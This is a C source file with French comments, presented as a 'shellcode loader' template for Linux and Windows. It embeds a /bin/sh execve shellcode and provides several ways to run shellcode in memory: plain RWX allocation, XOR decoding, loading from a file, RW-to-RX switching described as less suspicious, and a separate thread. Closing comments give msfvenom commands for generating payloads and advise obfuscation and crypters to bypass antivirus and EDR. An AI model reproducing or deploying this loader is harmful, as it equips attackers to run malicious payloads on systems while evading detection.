/*
 * Template: Shellcode Loader
 * Charge et exécute shellcode en mémoire
 * Multi-platform (Linux/Windows)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <sys/mman.h>
    #include <unistd.h>
#endif

// Shellcode exemple (calculatrice Windows ou /bin/sh Linux)
// REMPLACER avec shellcode réel
unsigned char shellcode[] =
    "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57"
    "\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05";

size_t shellcode_size = sizeof(shellcode) - 1;

// Loader Windows
#ifdef _WIN32
void *allocate_executable_memory(size_t size) {
    return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

void execute_shellcode(void *code) {
    ((void(*)())code)();
}

void cleanup_memory(void *addr, size_t size) {
    VirtualFree(addr, 0, MEM_RELEASE);
}
#else
// Loader Linux/Unix
void *allocate_executable_memory(size_t size) {
    void *mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

void execute_shellcode(void *code) {
    ((void(*)())code)();
}

void cleanup_memory(void *addr, size_t size) {
    munmap(addr, size);
}
#endif

// Decoder XOR
void xor_decode(unsigned char *data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// Loader basique
int load_and_execute_simple() {
    printf("[*] Allocation mémoire exécutable (%zu bytes)...\n", shellcode_size);

    void *exec_mem = allocate_executable_memory(shellcode_size);
    if (!exec_mem) {
        printf("[-] Allocation failed\n");
        return -1;
    }

    printf("[+] Mémoire allouée à: %p\n", exec_mem);

    printf("[*] Copie du shellcode...\n");
    memcpy(exec_mem, shellcode, shellcode_size);

    printf("[*] Exécution du shellcode...\n");
    execute_shellcode(exec_mem);

    printf("[+] Shellcode terminé\n");
    cleanup_memory(exec_mem, shellcode_size);

    return 0;
}

// Loader avec décodage XOR
int load_and_execute_encoded(unsigned char key) {
    printf("[*] Décodage du shellcode (XOR key: 0x%02x)...\n", key);

    // Décoder shellcode
    unsigned char *decoded = malloc(shellcode_size);
    memcpy(decoded, shellcode, shellcode_size);
    xor_decode(decoded, shellcode_size, key);

    printf("[+] Shellcode décodé\n");

    void *exec_mem = allocate_executable_memory(shellcode_size);
    if (!exec_mem) {
        free(decoded);
        return -1;
    }

    memcpy(exec_mem, decoded, shellcode_size);
    free(decoded);

    printf("[*] Exécution...\n");
    execute_shellcode(exec_mem);

    cleanup_memory(exec_mem, shellcode_size);
    return 0;
}

// Loader depuis fichier
int load_from_file(const char *filename) {
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        perror("fopen");
        return -1;
    }

    // Obtenir taille fichier
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    printf("[*] Chargement de %s (%ld bytes)...\n", filename, file_size);

    // Lire shellcode
    unsigned char *buffer = malloc(file_size);
    if (fread(buffer, 1, file_size, fp) != file_size) {
        perror("fread");
        fclose(fp);
        free(buffer);
        return -1;
    }

    fclose(fp);

    // Allouer et exécuter
    void *exec_mem = allocate_executable_memory(file_size);
    if (!exec_mem) {
        free(buffer);
        return -1;
    }

    memcpy(exec_mem, buffer, file_size);
    free(buffer);

    printf("[*] Exécution...\n");
    execute_shellcode(exec_mem);

    cleanup_memory(exec_mem, file_size);
    return 0;
}

// Loader RW->RX (moins suspect qu'RWX direct)
int load_and_execute_safe() {
#ifdef _WIN32
    DWORD old_protect;

    // Allouer RW
    void *mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    // Copier shellcode
    memcpy(mem, shellcode, shellcode_size);

    // Changer vers RX
    VirtualProtect(mem, shellcode_size, PAGE_EXECUTE_READ, &old_protect);

    // Exécuter
    execute_shellcode(mem);

    VirtualFree(mem, 0, MEM_RELEASE);
#else
    // Linux
    void *mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return -1;

    memcpy(mem, shellcode, shellcode_size);

    // Changer protection
    mprotect(mem, shellcode_size, PROT_READ | PROT_EXEC);

    execute_shellcode(mem);

    munmap(mem, shellcode_size);
#endif

    return 0;
}

// Loader avec thread séparé
#ifdef _WIN32
DWORD WINAPI thread_func(LPVOID param) {
    void (*func)() = (void(*)())param;
    func();
    return 0;
}

int load_and_execute_threaded() {
    void *mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, shellcode, shellcode_size);

    HANDLE hThread = CreateThread(NULL, 0, thread_func, mem, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
#endif

int main(int argc, char *argv[]) {
    printf("=== Shellcode Loader ===\n\n");

    if (argc > 1) {
        // Charger depuis fichier
        return load_from_file(argv[1]);
    }

    // Choix du mode
#ifdef ENCODED
    return load_and_execute_encoded(0xAA);
#elif defined(SAFE)
    return load_and_execute_safe();
#elif defined(THREADED) && defined(_WIN32)
    return load_and_execute_threaded();
#else
    return load_and_execute_simple();
#endif
}

/*
 * Compilation:
 *   # Linux simple
 *   gcc loader.c -o loader
 *
 *   # Windows simple
 *   x86_64-w64-mingw32-gcc loader.c -o loader.exe
 *
 *   # Avec décodage XOR
 *   gcc -DENCODED loader.c -o loader
 *
 *   # Mode safe (RW->RX)
 *   gcc -DSAFE loader.c -o loader
 *
 *   # Windows threadé
 *   x86_64-w64-mingw32-gcc -DTHREADED loader.c -o loader.exe
 *
 * Usage:
 *   # Shellcode embedded
 *   ./loader
 *
 *   # Depuis fichier
 *   ./loader shellcode.bin
 *
 * Générer shellcode:
 *   # Linux
 *   msfvenom -p linux/x64/exec CMD=/bin/sh -f raw > shellcode.bin
 *
 *   # Windows
 *   msfvenom -p windows/x64/exec CMD=calc.exe -f raw > shellcode.bin
 *
 *   # Encoder XOR
 *   msfvenom -p linux/x64/exec CMD=/bin/sh -e x64/xor -f c
 *
 * Notes:
 *   - RWX pages sont suspectes (EDR/AV)
 *   - Préférer RW->RX ou utiliser code caves
 *   - Obfusquer strings et shellcode
 *   - Utiliser encoders/crypters pour bypass AV
 */
